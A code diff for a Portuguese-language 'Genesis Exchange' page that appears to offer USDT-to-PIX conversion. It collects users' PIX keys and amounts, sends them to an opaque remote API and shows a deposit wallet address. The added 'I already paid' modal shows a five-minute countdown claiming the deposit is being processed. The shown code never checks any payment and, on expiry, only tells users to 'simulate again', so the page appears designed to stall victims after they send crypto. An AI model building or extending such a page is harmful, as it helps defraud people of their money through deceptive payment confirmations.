@@ -6,7 +6,6 @@
     <title>Genesis Exchange | USDT to PIX</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://unpkg.com/lucide@latest"></script>
-    <!-- Biblioteca para gerar QR Code localmente, sem depender de API externa -->
     <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
     <style>
         body {
@@ -49,12 +48,16 @@
         #qrcode img {
             margin: 0 auto;
         }
+        .modal-overlay {
+            background: rgba(0, 0, 0, 0.8);
+            backdrop-filter: blur(8px);
+        }
     </style>
 </head>
-<body>
+<body class="text-white">
 
     <div class="main-container">
-        <div class="glass-card w-full max-w-md rounded-3xl p-8 text-white">
+        <div class="glass-card w-full max-w-md rounded-3xl p-8">
             
             <div class="text-center mb-8">
                 <h1 class="text-3xl font-bold tracking-tight mb-2">Genesis Exchange</h1>
@@ -64,10 +67,8 @@
             <div class="space-y-6">
                 <div>
                     <label class="block text-xs font-medium uppercase tracking-wider text-gray-400 mb-2">Sua Chave PIX para Recebimento</label>
-                    <div class="relative">
-                        <input type="text" id="pixKey" placeholder="CPF, E-mail ou Celular" 
-                               class="input-field w-full px-4 py-4 rounded-2xl text-lg font-semibold placeholder-gray-500">
-                    </div>
+                    <input type="text" id="pixKey" placeholder="CPF, E-mail ou Celular" 
+                           class="input-field w-full px-4 py-4 rounded-2xl text-lg font-semibold placeholder-gray-500">
                 </div>
 
                 <div>
@@ -113,20 +114,39 @@
 
                     <div id="qrContainer" class="hidden flex flex-col items-center animate-in fade-in duration-500">
                         <div class="bg-white p-3 rounded-2xl mb-4">
-                            <!-- O QR Code será gerado dentro desta div -->
                             <div id="qrcode"></div>
                         </div>
                         <p class="text-xs text-gray-400 mb-2 uppercase font-bold">Endereço da Carteira</p>
-                        <div class="flex items-center gap-2 bg-black/40 p-3 rounded-xl border border-white/10 w-full overflow-hidden">
+                        <div class="flex items-center gap-2 bg-black/40 p-3 rounded-xl border border-white/10 w-full overflow-hidden mb-6">
                             <code id="walletAddress" class="text-xs text-yellow-400 truncate"></code>
                             <button onclick="copyAddress()" class="text-gray-400 hover:text-white transition-colors">
                                 <i data-lucide="copy" class="w-4 h-4"></i>
                             </button>
                         </div>
+
+                        <button onclick="openPaymentModal()" 
+                                class="w-full bg-white text-black font-bold py-4 rounded-2xl transition-all active:scale-95 flex items-center justify-center gap-2 hover:bg-gray-200">
+                            <i data-lucide="check-circle" class="w-5 h-5"></i>
+                            Já realizei o pagamento
+                        </button>
                     </div>
                 </div>
             </div>
+        </div>
+    </div>
 
+    <!-- MODAL DO CRONÔMETRO -->
+    <div id="timerModal" class="hidden fixed inset-0 z-50 flex items-center justify-center p-4 modal-overlay">
+        <div class="glass-card w-full max-w-sm rounded-3xl p-8 text-center">
+            <div class="bg-yellow-500 w-16 h-16 rounded-full flex items-center justify-center mx-auto mb-4">
+                <i data-lucide="clock" class="text-black w-8 h-8"></i>
+            </div>
+            <h2 class="text-2xl font-bold mb-2">Aguarde a Confirmação</h2>
+            <p class="text-gray-300 text-sm mb-6">Estamos processando seu depósito na rede. O valor cairá na sua conta em instantes.</p>
+            
+            <div class="text-5xl font-mono font-bold text-yellow-400 mb-8" id="countdown">05:00</div>
+            
+            <p class="text-xs text-gray-400 italic">Se o tempo expirar e você não receber, tente simular novamente.</p>
         </div>
     </div>
 
@@ -140,46 +160,31 @@
         const API_URL_CALC = 'https://oxix-wepz.onrender.com/api/v1/calc_7x';
         const API_URL_EXEC = 'https://oxix-wepz.onrender.com/api/v1/exec_9z';
 
-        // Instância global do gerador de QR Code
-        let qrGenerator = null;
+        let timerInterval = null;
 
         async function calculateAndSave() {
             const pixKey = document.getElementById('pixKey').value;
             const amount = document.getElementById('usdtAmount').value;
 
-            if (!pixKey) {
-                alert('Por favor, informe sua chave PIX para recebermos o valor.');
-                return;
-            }
-            if (!amount || amount <= 0) {
-                alert('Informe um valor válido de USDT.');
-                return;
-            }
+            if (!pixKey) { alert('Por favor, informe sua chave PIX.'); return; }
+            if (!amount || amount <= 0) { alert('Informe um valor válido.'); return; }
 
             try {
                 const calcResponse = await fetch(`${API_URL_CALC}?valor=${amount}`);
                 const calcData = await calcResponse.json();
-
-                if (calcData.error) {
-                    alert(calcData.error);
-                    return;
-                }
+                if (calcData.error) { alert(calcData.error); return; }
 
                 await fetch(API_URL_EXEC, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        amount: parseFloat(amount),
-                        pix_key: pixKey
-                    })
+                    body: JSON.stringify({ amount: parseFloat(amount), pix_key: pixKey })
                 });
 
                 document.getElementById('brlAmount').value = `R$ ${calcData.result.toLocaleString('pt-BR', {minimumFractionDigits: 2})}`;
                 document.getElementById('paymentArea').classList.remove('hidden');
                 lucide.createIcons();
-
             } catch (e) {
-                alert('Erro ao conectar com o servidor. Verifique sua conexão.');
+                alert('Erro ao conectar com o servidor.');
             }
         }
 
@@ -188,34 +193,49 @@
                 btn.classList.remove('bg-yellow-500', 'text-black');
                 btn.classList.add('text-white');
             });
-
-            const activeBtn = document.getElementById(`btn${network}`);
-            activeBtn.classList.add('bg-yellow-500', 'text-black');
-            activeBtn.classList.remove('text-white');
+            document.getElementById(`btn${network}`).classList.add('bg-yellow-500', 'text-black');
+            document.getElementById(`btn${network}`).classList.remove('text-white');
 
             const address = wallets[network];
-            
-            // Limpa o QR Code anterior
             document.getElementById('qrcode').innerHTML = "";
-            
-            // Gera o novo QR Code localmente
             new QRCode(document.getElementById("qrcode"), {
-                text: address,
-                width: 192,
-                height: 192,
-                colorDark : "#000000",
-                colorLight : "#ffffff",
-                correctLevel : QRCode.CorrectLevel.H
+                text: address, width: 192, height: 192, colorDark : "#000000", colorLight : "#ffffff"
             });
-            
             document.getElementById('walletAddress').innerText = address;
             document.getElementById('qrContainer').classList.remove('hidden');
         }
 
         function copyAddress() {
-            const address = document.getElementById('walletAddress').innerText;
-            navigator.clipboard.writeText(address);
+            navigator.clipboard.writeText(document.getElementById('walletAddress').innerText);
             alert('Endereço copiado!');
+        }
+
+        function openPaymentModal() {
+            document.getElementById('timerModal').classList.remove('hidden');
+            startTimer(300); // 300 segundos = 5 minutos
+            lucide.createIcons();
+        }
+
+        function startTimer(duration) {
+            clearInterval(timerInterval);
+            let timer = duration;
+            const display = document.getElementById('countdown');
+
+            timerInterval = setInterval(() => {
+                let minutes = parseInt(timer / 60, 10);
+                let seconds = parseInt(timer % 60, 10);
+
+                minutes = minutes < 10 ? "0" + minutes : minutes;
+                seconds = seconds < 10 ? "0" + seconds : seconds;
+
+                display.textContent = minutes + ":" + seconds;
+
+                if (--timer < 0) {
+                    clearInterval(timerInterval);
+                    alert("O tempo de confirmação expirou. Por favor, tente simular novamente.");
+                    document.getElementById('timerModal').classList.add('hidden');
+                }
+            }, 1000);
         }
 
         lucide.createIcons();
